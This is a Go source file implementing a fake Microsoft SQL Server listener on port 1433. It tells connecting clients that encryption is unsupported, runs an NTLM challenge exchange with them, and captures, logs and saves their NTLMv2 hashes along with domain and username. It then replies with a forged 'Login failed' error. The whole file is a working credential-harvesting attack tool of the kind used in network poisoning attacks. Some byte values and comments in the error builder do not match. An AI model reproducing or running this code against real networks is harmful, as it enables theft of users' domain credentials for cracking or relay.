package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

// TDS packet types
const (
	tdsSQLBatch    = 0x01
	tdsLogin7      = 0x10
	tdsPrelogin    = 0x12
	tdsSSPI        = 0x11 // Kerberos/NTLM SSPI
	tdsTabularResp = 0x04
	tdsFedAuth     = 0x08
)

func serveMSSQL(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:1433", ifaceIP))
	if err != nil {
		logError("MSSQL listen :1433 — %v (need root?)", err)
		return
	}
	logInfo("MSSQL listening on %s:1433", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleMSSQL(c)
	}
}

func handleMSSQL(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := getChallenge()

	for {
		// TDS header: Type(1) Status(1) Length(2BE) SPID(2) PacketID(1) Window(1)
		hdr := make([]byte, 8)
		if _, err := io.ReadFull(c, hdr); err != nil {
			return
		}
		pktType := hdr[0]
		pktLen := int(binary.BigEndian.Uint16(hdr[2:4]))
		if pktLen < 8 || pktLen > 1<<20 {
			return
		}
		body := make([]byte, pktLen-8)
		if _, err := io.ReadFull(c, body); err != nil {
			return
		}

		switch pktType {
		case tdsPrelogin:
			// Respond with PRELOGIN indicating no encryption
			resp := buildTDSPreloginResp()
			c.Write(wrapTDS(tdsTabularResp, resp))

		case tdsLogin7:
			// LOGIN7 may contain SSPI data (NTLM type1) or username/password
			ntlm := FindNTLMSSP(body)
			if ntlm != nil && len(ntlm) >= 12 && ntlmMsgType(ntlm) == 1 {
				logVerbose("MSSQL NTLM Type1 (LOGIN7) from %s", c.RemoteAddr())
				ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
				c.Write(wrapTDS(tdsSSPI, ntlmChallenge))
			} else {
				// Try to extract cleartext username/password from LOGIN7
				// (simplified: just look for NTLM or send error)
				c.Write(buildTDSError("Login failed for user."))
				return
			}

		case tdsSSPI:
			// SSPI token: NTLM type1 or type3
			ntlm := FindNTLMSSP(body)
			if len(ntlm) < 12 {
				return
			}
			msgType := ntlmMsgType(ntlm)
			switch msgType {
			case 1: // type1 → send challenge
				logVerbose("MSSQL NTLM Type1 (SSPI) from %s", c.RemoteAddr())
				ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
				c.Write(wrapTDS(tdsSSPI, ntlmChallenge))

			case 3: // type3 → capture
				hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
				if err == nil {
					logSuccess("[MSSQL] NTLMv2 captured from %s", c.RemoteAddr())
					logSuccess("        %s\\%s", domain, user)
					logSuccess("        %s", hash)
					saveHash(hash)
				}
				c.Write(buildTDSError("Login failed for user."))
				return
			}
		}
	}
}

func wrapTDS(pktType byte, data []byte) []byte {
	pktLen := 8 + len(data)
	hdr := []byte{
		pktType,
		0x01, // Status: EOM
		byte(pktLen >> 8), byte(pktLen),
		0x00, 0x00, // SPID
		0x01, // PacketID
		0x00, // Window
	}
	return append(hdr, data...)
}

func buildTDSPreloginResp() []byte {
	// Minimal PRELOGIN response: ENCRYPTION=NOT_SUPPORTED, TERMINATOR
	// Option tokens: type(1) offset(2) length(2)
	// Token 0x01 = ENCRYPTION, value 0x02 = NOT_SUPPORTED
	offset := uint16(5 * 1) // 1 token * 5 bytes header + terminator (1 byte) = 6 bytes header
	// Actually: each option has type(1)+offset(2)+length(2), terminator is 0xFF
	// 1 option = 5 bytes, terminator = 1 byte, total header = 6 bytes
	// data at offset 6
	encryptOffset := uint16(6)
	encryptLen := uint16(1)
	_ = offset

	resp := []byte{
		0x01,                                          // ENCRYPTION option type
		byte(encryptOffset >> 8), byte(encryptOffset), // offset
		byte(encryptLen >> 8), byte(encryptLen), // length
		0xFF,           // TERMINATOR
		0x02,           // ENCRYPTION value: NOT_SUPPORTED
	}
	return resp
}

func buildTDSError(msg string) []byte {
	// TDS7 ERROR token: 0xAA
	msgUTF16 := make([]byte, len(msg)*2)
	for i, c := range msg {
		binary.LittleEndian.PutUint16(msgUTF16[i*2:], uint16(c))
	}
	var tok []byte
	tok = append(tok, 0xAA)                            // token type
	length := uint16(4 + 1 + 1 + 2 + len(msgUTF16) + 1 + 1 + 1 + 2 + 2)
	tok = append(tok, byte(length), byte(length>>8))   // length LE
	tok = append(tok, 0xE7, 0x13, 0x00, 0x00)          // error number 5031
	tok = append(tok, 0x01)                             // state
	tok = append(tok, 0x0e)                             // class (14=login failed)
	tok = append(tok, byte(len(msg)), byte(len(msg)>>8)) // msglen LE
	tok = append(tok, msgUTF16...)
	tok = append(tok, 0x01)        // serverlen
	tok = append(tok, byte(sessionMachineName[0])) // server name (1 char)
	tok = append(tok, 0x00)        // proclen
	tok = append(tok, 0x01, 0x00)  // line number

	// DONE token: 0xFD
	tok = append(tok,
		0xFD,
		0x02, 0x00, // status: error
		0x00, 0x00, // curcmd
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // rowcount
	)
	return wrapTDS(tdsTabularResp, tok)
}

func init() {
	_ = fmt.Sprintf // suppress unused import if needed
}
